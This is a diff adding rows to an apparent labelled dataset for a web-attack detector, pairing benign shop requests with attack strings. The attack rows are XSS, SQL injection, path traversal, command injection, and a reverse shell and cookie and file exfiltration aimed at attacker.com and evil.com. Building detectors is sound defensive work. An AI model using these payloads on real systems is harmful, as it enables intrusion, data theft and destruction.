+<svg><script>alert(1)</script></svg>,1
+"; python -c 'import socket,subprocess'",1
+browse category mobile phones req153,0
+filter name brand by apply req202,0
+GET /api/swagger.json HTTP/1.1,1
+recommendations based on history view req912,0
+1' GROUP BY 1--,1
+; whoami,1
+learning machine search books req390,0
+../.env,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+GET /.htaccess HTTP/1.1,1
+multiple failed login attempts detected for admin,1
+username=admin&password=admin123,1
+related view products section req84,0
+track with tracking shipment req246,0
+1' OR '1'='1,1
+' HAVING 1=1--,1
+"id=1 AND 1=CONVERT(int,@@version)--",1
+contact support for refund request req267,0
+products category search for req217,0
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+GET /robots.txt scan probe reconnaissance,1
+compare products two specifications req786,0
+rate review product req1196,0
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+sort newest arrivals listing by req565,0
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+rate stars 5 product review req487,0
+specifications compare products two req761,0
+1' AND SLEEP(5)--,1
+set preference to express delivery req1083,0
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+"; python -c 'import socket,subprocess'",1
+"1 UNION SELECT @@version,NULL--",1
+../../.git/config,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+../../.git/config,1
+and login username with password req738,0
+via social product share link media req678,0
+account dashboard for get user req266,0
+../.env,1
+id=2 OR 1=1,1
+card credit payment checkout with req1130,0
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+register new email req27,0
+1' OR 1=1--,1
+login password with req198,0
+link via password reset email req228,0
+<script>alert('XSS')</script>,1
+; ls -la,1
+php://filter/convert.base64-encode/resource=config.php,1
+two factor authentication enable req1006,0
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+<video src=1 onerror=alert(1)>,1
+....//....//etc/passwd,1
+form for website submit feedback req882,0
+brand filter by req206,0
+' HAVING 1=1--,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+factor enable authentication two req573,0
+listing sort by req966,0
+<textarea onfocus=alert(1) autofocus>,1
+item id 42 product add req434,0
+listing by arrivals sort newest req658,0
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+|| nc -e /bin/sh attacker.com 4444,1
+<video src=1 onerror=alert(1)>,1
+cart item to req1,0
+about search books learning machine req83,0
+upload jpeg picture profile format req372,0
+& net user hacker Password1 /add,1
+<audio src=1 onerror=alert(1)>,1
+mobile phones category req655,0
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+compare two products specifications req856,0
+<object data=javascript:alert(1)>,1
+; ping -c 4 attacker.com,1
+<input onfocus=alert(1) autofocus>,1
+& net user hacker Password1 /add,1
+specifications two products compare req744,0
+filter brand apply by name req551,0
+language arabic to account req225,0
+shipment tracking track number with req623,0
+..%2F..%2F..%2Fetc%2Fpasswd,1
+' HAVING 1=1--,1
+order update shipping req874,0
+username=root&password=root,1
+view recommendations history based on req125,0
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+<object data=javascript:alert(1)>,1
+username=test&password=test,1
+locations map on store view req454,0
+username=admin&password=123456,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+1' ORDER BY 10--,1
+1' ORDER BY 10--,1
+tracking with track number req627,0
+range filter to price results by req1075,0
+username=admin&password=admin123,1
+username=admin&password=superman,1
+id add product item 42 req104,0
+GET /api/swagger.json HTTP/1.1,1
+jpeg format upload req186,0
+for invoice download order req408,0
+GET /wp-admin HTTP/1.1,1
+"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
+with register account new req873,0
+GET /phpmyadmin HTTP/1.1,1
+<script>alert('XSS')</script>,1
+GET /wp-admin HTTP/1.1,1
+<ScRiPt>alert(1)</ScRiPt>,1
+based on recommendations history view req560,0
+view 30 order req157,0
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+settings notification panel view req541,0
+product link share social media req493,0
+apply discount at checkout coupon req939,0
+sort listing newest arrivals by req609,0
+report data as req772,0
+billing for address req742,0
+register new with email req422,0
+<select onfocus=alert(1) autofocus>,1
+<object data=javascript:alert(1)>,1
+1' OR 1=1--,1
+"';alert(String.fromCharCode(88,83,83))//",1
+for feedback website req1079,0
+export csv report data as req471,0
+new with account req1151,0
+arrivals listing by newest sort req1021,0
+account with new register email req765,0
+via media share product link req624,0
+electronics for products category search req1014,0
+"1 UNION SELECT @@version,NULL--",1
+username=admin&password=batman,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+update address order for req1185,0
+"';alert(String.fromCharCode(88,83,83))//",1
+1' GROUP BY 1--,1
+account address update billing for req32,0
+../../wp-config.php,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+| cat /etc/passwd,1
+; whoami,1
+subscribe with email to newsletter req55,0
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+"1 UNION SELECT username,password FROM users--",1
+password spray attack detected multiple users,1
+two compare products req516,0
+GET /admin/config.php HTTP/1.1,1
+|| nc -e /bin/sh attacker.com 4444,1
+policy view product for return req449,0
+view on store locations req538,0
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+username=admin'/*,1
+username=admin&password=qwerty,1
+<svg><script>alert(1)</script></svg>,1
+; ls -la,1
+/etc/passwd%00,1
+username=admin&password=admin,1
+../../../etc/shadow,1
+<input onfocus=alert(1) autofocus>,1
+GET /.htaccess HTTP/1.1,1
+username=root&password=root,1
+return product view policy for req129,0
+& ipconfig,1
+1' GROUP BY 1--,1
+../../../../etc/passwd,1
+category mobile phones browse req547,0
+authentication factor two enable req164,0
+brand by name apply filter req1166,0
+../../../../var/www/html/config.php,1
+GET /api/swagger.json HTTP/1.1,1
+from logout session req812,0
+1' OR '1'='1,1
+for store availability check item req23,0
+' OR 1=1#,1
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+username=admin&password=admin,1
+search learning about req662,0
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+' HAVING 1=1--,1
+website form feedback submit for req445,0
+; curl http://evil.com/$(cat /etc/passwd | base64),1
+to email subscribe with newsletter req746,0
+"id=1 AND 1=CONVERT(int,@@version)--",1
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
+"id=1 AND 1=CONVERT(int,@@version)--",1
+username=admin&password=superman,1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+express delivery to set preference req926,0
+website feedback form req1024,0
+with credit checkout req637,0
+language to arabic change req28,0
+username=admin&password=superman,1
+phones category browse req507,0
+GET /admin/config.php HTTP/1.1,1
+GET /actuator/env HTTP/1.1,1
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+to arabic account language change req347,0
+$(whoami),1
+multiple failed login attempts detected for admin,1
+1'; EXEC xp_cmdshell('whoami')--,1
+view and conditions page terms req415,0
+notification settings view panel req36,0
+GET /server-status HTTP/1.1,1
+1' ORDER BY 10--,1
+last view order req762,0
+1' GROUP BY 1--,1
+username=root&password=root,1
+arrivals listing newest by req438,0
+%3Cscript%3Ealert(1)%3C/script%3E,1
+username=admin&password=batman,1
+admin' AND 1=1--,1
+<video src=1 onerror=alert(1)>,1
+| cat /etc/passwd,1
+1'; WAITFOR DELAY '0:0:5'--,1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+<img src=x onerror=alert(1)>,1
+"';alert(String.fromCharCode(88,83,83))//",1
+refund support for req145,0
+brute force attempt on login endpoint from single ip,1
+1'; DELETE FROM orders WHERE 1=1--,1
+factor two enable authentication req890,0
+username=admin&password=letmein,1
+view notification settings panel req9,0
+link share media social product via req872,0
+product social share link via req1084,0
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+; ping -c 4 attacker.com,1
+news get latest articles req1188,0
+related section products view req482,0
+feed articles news latest req1023,0
+password=1' OR '1'='1' /*,1
+map store on req463,0
+../../../../proc/self/environ,1
+username=admin&password=qwerty,1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+../../wp-config.php,1
+number for download req208,0
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+<body onload=alert('XSS')>,1
+newest arrivals sort by req546,0
+1'; WAITFOR DELAY '0:0:5'--,1
+search about books learning machine req307,0
+for order invoice download req716,0
+GET /crossdomain.xml HTTP/1.1,1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+to later save for item wishlist req690,0
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+section related view products req173,0
+<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
+via product media social link req1000,0
+<iframe src=javascript:alert('XSS')>,1
+<details open ontoggle=alert(1)>,1
+username=admin'/*,1
+....//....//etc/passwd,1
+compare specifications two products req778,0
+filter by brand req56,0
+file:///etc/passwd,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+; whoami,1
+& ipconfig,1
+password spray attack detected multiple users,1
+/etc/passwd%00,1
+login username password and with req558,0
+<svg onload=alert(document.domain)>,1
+; whoami,1
+GET /api/swagger.json HTTP/1.1,1
+<div onmouseover=alert(1)>hover</div>,1
+arabic change to req1170,0
+username=administrator&password=12345,1
+GET /crossdomain.xml HTTP/1.1,1
+password email link via reset req676,0
+export data as report csv req383,0
+and view terms page req983,0
+email newsletter to with subscribe req314,0
+`id`,1
+on based view history recommendations req369,0
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+1' OR '1'='1,1
+GET /phpmyadmin HTTP/1.1,1
+username=admin&password=batman,1
+1'; EXEC xp_cmdshell('whoami')--,1
+authentication factor two enable req937,0
+<object data=javascript:alert(1)>,1
+/var/log/apache2/access.log,1
+at coupon discount req1129,0
+store locations map on view req1174,0
+username=admin&password=1234567890,1
+<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+1' GROUP BY 1--,1
+review rate product stars req749,0
+GET /robots.txt scan probe reconnaissance,1
+GET /web.config HTTP/1.1,1
+GET /crossdomain.xml HTTP/1.1,1
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+rate stars review req216,0
+search machine about books req1095,0
+1'; EXEC xp_cmdshell('whoami')--,1
+../.env,1
+username=admin&password=123456,1
+for account update req636,0
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+file:///etc/passwd,1
+username=admin&password=batman,1
+rate review product req522,0
+<video src=1 onerror=alert(1)>,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+<script>document.location='http://evil.com/steal?c='+document.cookie</script>,1
+1' AND SLEEP(5)--,1
+username=admin&password=letmein,1
+"1 UNION SELECT @@version,NULL--",1
+; curl http://evil.com/$(cat /etc/passwd | base64),1
+session from logout req699,0
+view conditions terms req196,0
+GET /web.config HTTP/1.1,1
+rate 5 product review req1110,0
+<input onfocus=alert(1) autofocus>,1
+update address billing for req1155,0
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+GET /crossdomain.xml HTTP/1.1,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+' HAVING 1=1--,1
+<video src=1 onerror=alert(1)>,1
+../.env,1
+username=user&password=pass,1
+GET /phpmyadmin HTTP/1.1,1
+../../../../etc/passwd,1
+with register new email account req910,0
+& ipconfig,1
+5 rate product req401,0
+enable factor two authentication req40,0
+username=admin&password=abc123,1
+email link password req924,0
+notification view settings req599,0
+; ls -la,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+../../../../etc/passwd,1
+' OR 'x'='x,1
+& ipconfig,1
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+`id`,1
+check availability for item req450,0
+"';alert(String.fromCharCode(88,83,83))//",1
+username=admin&password=batman,1
+history order days 30 view req1106,0
+GET /web.config HTTP/1.1,1
+/etc/passwd%00,1
+mobile phones browse category req106,0
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+username=admin&password=superman,1
+& net user hacker Password1 /add,1
+| cat /etc/passwd,1
+1'; WAITFOR DELAY '0:0:5'--,1
+by brand apply name filter req671,0
+<ScRiPt>alert(1)</ScRiPt>,1
+1'; WAITFOR DELAY '0:0:5'--,1
+account address for billing req789,0
+with credit payment checkout card req1103,0
+by name brand apply filter req289,0
+jpeg upload format profile req834,0
+<a href='javascript:alert(1)'>click</a>,1
+login attempt failed username admin invalid credentials,1
+1; DROP TABLE users--,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+by electronics for search category products req341,0
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+"1 UNION SELECT @@version,NULL--",1
+view terms conditions and page req668,0
+username=admin&password=password,1
+for view policy req1067,0
+5 review stars req1044,0
+<script>alert('XSS')</script>,1
+arabic language account change req304,0
+username=admin'/*,1
+by brand apply req526,0
+link product media req1136,0
+1' OR 1=1--,1
+seller to message support send req884,0
+<object data=javascript:alert(1)>,1
+& net user hacker Password1 /add,1
+5 stars rate product review req881,0
+GET /config.bak HTTP/1.1,1
+view terms and conditions page req580,0
+username=administrator&password=12345,1
+report data export csv as req150,0
+address account billing update for req971,0
+5 product rate req183,0
+conditions page and req405,0
+GET /web.config HTTP/1.1,1
+<video src=1 onerror=alert(1)>,1
+username=admin&password=batman,1
+' OR 'x'='x,1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+<svg onload=alert(document.domain)>,1
+number for invoice download order req572,0
+<script>alert('XSS')</script>,1
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+1' ORDER BY 10--,1
+<div onmouseover=alert(1)>hover</div>,1
+invoice for order number download req189,0
+' OR 'x'='x,1
+| uname -a,1
+with card payment credit req0,0
+..\..\..\windows\system32\drivers\etc\hosts,1
+| cat /etc/passwd,1
+<img src=x onerror=alert(1)>,1
+username=admin'/*,1
+username=admin&password=password,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+/etc/passwd%00,1
+account with email new register req346,0
+based history on recommendations view req143,0
+articles latest news get feed req1051,0
+repeated authentication failure admin account locked,1
+username=admin&password=batman,1
+GET /.git/config HTTP/1.1,1
+item to cart req844,0
+GET /robots.txt scan probe reconnaissance,1
+to newsletter with email req527,0
+GET /.env HTTP/1.1,1
+..\..\..\windows\system32\drivers\etc\hosts,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+<audio src=1 onerror=alert(1)>,1
+<svg><script>alert(1)</script></svg>,1
+learning books about search req21,0
+history view days 30 req737,0
+page and view terms req740,0
+username=admin&password=admin,1
+GET /console HTTP/1.1,1
+& ipconfig,1
+<img src=1 onerror=fetch('http://attacker.com?c='+document.cookie)>,1
+<object data=javascript:alert(1)>,1
+for address shipping req261,0
+username=admin&password=password,1
+<details open ontoggle=alert(1)>,1
+GET /config.bak HTTP/1.1,1
+<object data=javascript:alert(1)>,1
+username=admin&password=superman,1
+add id to req80,0
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+shipment tracking number track with req757,0
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+GET /phpmyadmin HTTP/1.1,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+filter by 500 results 100 price req407,0
+at coupon apply discount checkout req512,0
+login attempt failed username admin invalid credentials,1
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+brute force attempt on login endpoint from single ip,1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+admin'--,1
+related products view section req741,0
+factor enable two authentication req387,0
+GET /.env HTTP/1.1,1
+<ScRiPt>alert(1)</ScRiPt>,1
+../../wp-config.php,1
+username=admin&password=monkey,1
+seller to support send message req94,0
+username=admin&password=123456,1
+../../../../etc/passwd,1
+<iframe src=javascript:alert('XSS')>,1
+section related view products req499,0
+; id,1
+history last for order req477,0
+item availability check req491,0
+support request contact for refund req47,0
+1' OR 1=1--,1
+<iframe src=javascript:alert('XSS')>,1
+search by electronics products category for req1127,0
+' OR 1=1#,1
+..\..\..\windows\system32\drivers\etc\hosts,1
+arabic language to change account req367,0
+1' ORDER BY 10--,1
+review rate stars product req706,0
+admin'--,1
+../../../etc/shadow,1
+GET /robots.txt scan probe reconnaissance,1
+username=admin&password=abc123,1
+filter apply brand by name req486,0
+mobile category phones browse req139,0
+GET /.git/config HTTP/1.1,1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+100 filter results range req608,0
+1' OR '1'='1,1
+' HAVING 1=1--,1
+<object data=javascript:alert(1)>,1
+and terms conditions page view req480,0
+; whoami,1
+GET /robots.txt scan probe reconnaissance,1
+<img src=x onerror=alert(1)>,1
+1' OR 1=1--,1
+5 rate product stars review req393,0
+to message support send seller req230,0
+GET /actuator/env HTTP/1.1,1
+password=1' OR '1'='1' /*,1
+username=admin&password=letmein,1
+via share product social link media req604,0
+|| nc -e /bin/sh attacker.com 4444,1
+brute force attempt on login endpoint from single ip,1
+1' OR 1=1--,1
+brute force attempt on login endpoint from single ip,1
+file:///etc/passwd,1
+logout from session current req893,0
+policy product for return view req859,0
+checkout coupon at apply discount req593,0
+GET /admin/config.php HTTP/1.1,1
+<body background=javascript:alert(1)>,1
+<img src=x onerror=alert(1)>,1
+| uname -a,1
+username=admin&password=monkey,1
+view based on history recommendations req670,0
+<object data=javascript:alert(1)>,1
+"1 UNION SELECT username,password FROM users--",1
+$(whoami),1
+username=admin&password=123456,1
+; whoami,1
+page and view req536,0
+locations view on req398,0
+"1 UNION SELECT @@version,NULL--",1
+username=administrator&password=12345,1
+& ipconfig,1
+seller to message support send req1156,0
+for support refund contact request req1159,0
+<a href='javascript:alert(1)'>click</a>,1
+file:///etc/passwd,1
+GET /wp-admin HTTP/1.1,1
+1'; WAITFOR DELAY '0:0:5'--,1
+$(whoami),1
+%3Cscript%3Ealert(1)%3C/script%3E,1
+1' ORDER BY 10--,1
+1' OR '1'='1,1
+1' GROUP BY 1--,1
+<ScRiPt>alert(1)</ScRiPt>,1
+newest sort by arrivals req88,0
+get feed articles req652,0
+' OR 1=1#,1
+1' OR '1'='1,1
+<textarea onfocus=alert(1) autofocus>,1
+rate stars 5 req733,0
+dashboard profile account get for req215,0
+change language arabic to account req921,0
+set preference to req862,0
+../../.git/config,1
+../../wp-config.php,1
+with to newsletter subscribe email req240,0
+1; DROP TABLE users--,1
+card with credit checkout payment req1193,0
+"<iframe src=data:text/html,<script>alert(1)</script>>",1
+machine books learning req883,0
+javascript:alert(document.cookie),1
+GET /.htaccess HTTP/1.1,1
+two enable factor authentication req1120,0
+user account get req505,0
+"<img src=""x"" onerror=""eval(atob('YWxlcnQoMSk='))"">",1
+; ls -la,1
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+username=admin&password=admin,1
+latest get feed articles news req140,0
+learning machine books search about req597,0
+/var/log/apache2/access.log,1
+username=admin&password=superman,1
+..\..\..\windows\system32\drivers\etc\hosts,1
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+GET /api/swagger.json HTTP/1.1,1
+category phones mobile browse req896,0
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+support for contact refund req592,0
+1' OR '1'='1,1
+<body background=javascript:alert(1)>,1
+"eval(String.fromCharCode(97,108,101,114,116,40,49,41))",1
+filter brand by req37,0
+1'; EXEC xp_cmdshell('whoami')--,1
+account billing address for update req436,0
+by filter name apply brand req909,0
+username=admin&password=abc123,1
+username=administrator&password=12345,1
+<svg><script>alert(1)</script></svg>,1
+media social link share via product req517,0
+admin'--,1
+1' AND SLEEP(5)--,1
+1'; EXEC xp_cmdshell('whoami')--,1
+1' OR '1'='1,1
+order last history view for days req777,0
+<audio src=1 onerror=alert(1)>,1
+username=admin&password=1234567890,1
+products specifications compare req253,0
+"1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",1
+../../wp-config.php,1
+username=root&password=root,1
+1' OR 1=1--,1
+admin'--,1
+product add 42 to id req521,0
+username=admin'/*,1
+login attempt failed username admin invalid credentials,1
+specifications two compare products req475,0
+order update address shipping for req770,0
+username=administrator&password=12345,1
+' OR 1=1#,1
+with track number tracking shipment req365,0
+filter brand by apply name req456,0
+user dashboard account req359,0
+format profile jpeg req1191,0
+../.env,1
+conditions and page req1061,0
+about books machine learning search req915,0
+store check item for availability req955,0
+"1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",1
+username=admin&password=letmein,1
+1'; EXEC xp_cmdshell('whoami')--,1
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+../../../../etc/passwd,1
+; curl http://evil.com/$(cat /etc/passwd | base64),1
+login attempt failed username admin invalid credentials,1
+GET /server-status HTTP/1.1,1
+view history days req916,0
+admin'--,1
+track shipment tracking with req370,0
+%3Cscript%3Ealert(1)%3C/script%3E,1
+`id`,1
+recommendations on history req556,0
+shipment with tracking track req504,0
+; cat /etc/shadow,1
+for number order download invoice req1055,0
+for download invoice number req902,0
+name apply filter req1148,0
+' OR 1=1#,1
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+new email account req656,0
+settings notification panel view req119,0
+1'; DELETE FROM orders WHERE 1=1--,1
+track with tracking shipment number req432,0
+at discount coupon req366,0
+php://filter/convert.base64-encode/resource=config.php,1
+item to for save later wishlist req866,0
+view map store on locations req996,0
+category by products for electronics search req986,0
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+../../../../var/www/html/config.php,1
+credit checkout payment card with req473,0
+<video src=1 onerror=alert(1)>,1
+rate stars product review req688,0
+"';alert(String.fromCharCode(88,83,83))//",1
+<ScRiPt>alert(1)</ScRiPt>,1
+' OR 'x'='x,1
+history order days 30 view for req356,0
+<input onfocus=alert(1) autofocus>,1
+last days for view req523,0
+data report as export csv req130,0
+GET /server-status HTTP/1.1,1
+username=administrator&password=12345,1
+../../../../proc/self/environ,1
+email with register new account req586,0
+view product return policy for req799,0
+; ping -c 4 attacker.com,1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+../../wp-config.php,1
+| uname -a,1
+<svg><script>alert(1)</script></svg>,1
+| uname -a,1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+recommendations history view on based req333,0
+multiple failed login attempts detected for admin,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+<IMG SRC=JaVaScRiPt:alert('XSS')>,1
+username=admin&password=password,1
+link email reset req956,0
+<script>alert('XSS')</script>,1
+1; DROP TABLE users--,1
+by brand apply name req187,0
+' OR 'x'='x,1
+username=admin&password=123456,1
+on map view req68,0
+id=2 OR 1=1,1
+/var/log/apache2/access.log,1
+../.env,1
+to seller message send support req769,0
+' OR 1=1#,1
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+repeated authentication failure admin account locked,1
+javascript:alert(document.cookie),1
+GET /.htaccess HTTP/1.1,1
+order download invoice number for req1018,0
+payment card with checkout req1144,0
+<svg><script>alert(1)</script></svg>,1
+products compare specifications req503,0
+username=admin&password=superman,1
+submit form feedback for website req105,0
+data as export req568,0
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+javascript:alert(document.cookie),1
+view panel settings req12,0
+terms conditions view req410,0
+GET /api/swagger.json HTTP/1.1,1
+"1 UNION SELECT @@version,NULL--",1
+dashboard get profile account for req234,0
+username=admin&password=password,1
+"1 AND 1=2 UNION SELECT 1,2,3--",1
+1' ORDER BY 10--,1
+admin' AND 1=1--,1
+GET /admin/config.php HTTP/1.1,1
+1'; WAITFOR DELAY '0:0:5'--,1
+' OR 'x'='x,1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+admin' AND 1=1--,1
+' OR 1=1#,1
+username=administrator&password=12345,1
+| uname -a,1
+<a href='javascript:alert(1)'>click</a>,1
+<SCRIPT>alert('XSS')</SCRIPT>,1
+payment credit checkout req1088,0
+<input onfocus=alert(1) autofocus>,1
+GET /admin/config.php HTTP/1.1,1
+1; SELECT * FROM users WHERE username LIKE '%admin%'--,1
+; ping -c 4 attacker.com,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+account update address for billing req864,0
+../.env,1
+account user dashboard get req171,0
+username=admin&password=qwerty,1
+express preference to set req29,0
+export as report data csv req1089,0
+report as csv data req250,0
+change language arabic to req38,0
+days history view req412,0
+<audio src=1 onerror=alert(1)>,1
+<textarea onfocus=alert(1) autofocus>,1
+current from logout session req961,0
+repeated authentication failure admin account locked,1
+billing account update address for req121,0
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+for update order shipping address req263,0
+tracking number track req1133,0
+by name filter apply brand req510,0
+....//....//etc/passwd,1
+csv report export data as req351,0
+1' OR '1'='1,1
+apply filter name brand by req326,0
+submit website form feedback req680,0
+../.env,1
+GET /robots.txt scan probe reconnaissance,1
+password spray attack detected multiple users,1
+$(whoami),1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+../../../../proc/self/environ,1
+current session logout from req1062,0
+for invoice download number order req785,0
+for by products search electronics category req748,0
+price filter range to req241,0
+shipping address update for order req823,0
+for get profile req760,0
+account register with email new req870,0
+username=admin&password=superman,1
+<<SCRIPT>alert('XSS');//<</SCRIPT>,1
+invoice download number order for req451,0
+GET /backup.sql HTTP/1.1,1
+billing update account address for req745,0
+"<IMG SRC=`javascript:alert(""XSS"")`>",1
+item availability store req811,0
+search books about learning req550,0
+order shipping for address update req763,0
+; id,1
+; ls -la,1
+| wget http://attacker.com/shell.sh,1
+1' GROUP BY 1--,1
+; ls -la,1
+../../../etc/shadow,1
+' HAVING 1=1--,1
+<div onmouseover=alert(1)>hover</div>,1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+; ls -la,1
+section products view related req396,0
+to seller message send support req6,0
+javascript:alert(document.cookie),1
+& net user hacker Password1 /add,1
+two factor enable authentication req26,0
+..\..\..\windows\system32\drivers\etc\hosts,1
+1'; WAITFOR DELAY '0:0:5'--,1
+recommendations based view history on req858,0
+mobile phones browse category req1101,0
+GET /config.bak HTTP/1.1,1
+"name='; INSERT INTO users VALUES('hacker','pass')--",1
+username=admin&password=admin123,1
+../.env,1
+mobile category phones req447,0
+electronics for category by products search req364,0
+1' AND SLEEP(5)--,1
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+/var/log/apache2/access.log,1
+GET /page?id=1'%20OR%20'1'='1 HTTP/1.1,1
+../../../etc/shadow,1
+<ScRiPt>alert(1)</ScRiPt>,1
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+GET /web.config HTTP/1.1,1
+"1' UNION ALL SELECT NULL,NULL,NULL--",1
+mobile category phones browse req679,0
+password=1' OR '1'='1' /*,1
+apply by name brand req773,0
+GET /backup.sql HTTP/1.1,1
+shipment track tracking number with req329,0
+username=admin&password=abc123,1
+1' GROUP BY 1--,1
+name=test'; UPDATE users SET password='hacked' WHERE 1=1--,1
+../../../etc/shadow,1
+two specifications products req378,0
+express preference set to delivery req478,0
+books search learning about machine req50,0
+data export csv req661,0
+../../../../proc/self/environ,1
+multiple failed login attempts detected for admin,1
+username=admin&password=123456,1
+category phones mobile req1013,0
+id to 42 add item product req1041,0
+support contact for req603,0
+<script>new Image().src='http://attacker.com/steal?cookie='+encodeURIComponent(document.cookie)</script>,1
+username=user&password=pass,1
+account change arabic to req1070,0
+update shipping for order address req605,0
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1
+../../../../etc/passwd,1
+refund request contact support for req115,0
+; ping -c 4 attacker.com,1
+1; DROP TABLE users--,1
+& net user hacker Password1 /add,1
+<iframe src=javascript:alert('XSS')>,1
+$(whoami),1
+add item 42 cart to req1010,0
+$(whoami),1
+1'; DELETE FROM orders WHERE 1=1--,1
+..\..\..\windows\system32\drivers\etc\hosts,1
+for return product req236,0
+id=2 OR 1=1,1
+& ipconfig,1
+GET /robots.txt scan probe reconnaissance,1
+<div onmouseover=alert(1)>hover</div>,1
+1'; EXEC xp_cmdshell('whoami')--,1
+settings view panel notification req1045,0
+admin'--,1
+save item later req795,0
+and username with password req665,0
+username=admin&password=admin123,1
+1'; DELETE FROM orders WHERE 1=1--,1
+update order shipping req509,0
+history order last req159,0
+' HAVING 1=1--,1
+phones mobile category browse req291,0
+username=admin&password=batman,1
+; id,1
+"' UNION SELECT 1,table_name FROM information_schema.tables--",1
+<iframe src=javascript:alert('XSS')>,1
+"1 UNION SELECT username,password FROM users--",1
+1'; WAITFOR DELAY '0:0:5'--,1
+1; DROP TABLE users--,1
+search=test' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+' OR 'x'='x,1
+<textarea onfocus=alert(1) autofocus>,1
+1; DROP TABLE users--,1
+<select onfocus=alert(1) autofocus>,1
+export csv as data req52,0
+product link media social req17,0
+; id,1
+to cart item req633,0
+two factor authentication enable req801,0
+"';alert(String.fromCharCode(88,83,83))//",1
+; id,1
+1'; EXEC xp_cmdshell('whoami')--,1
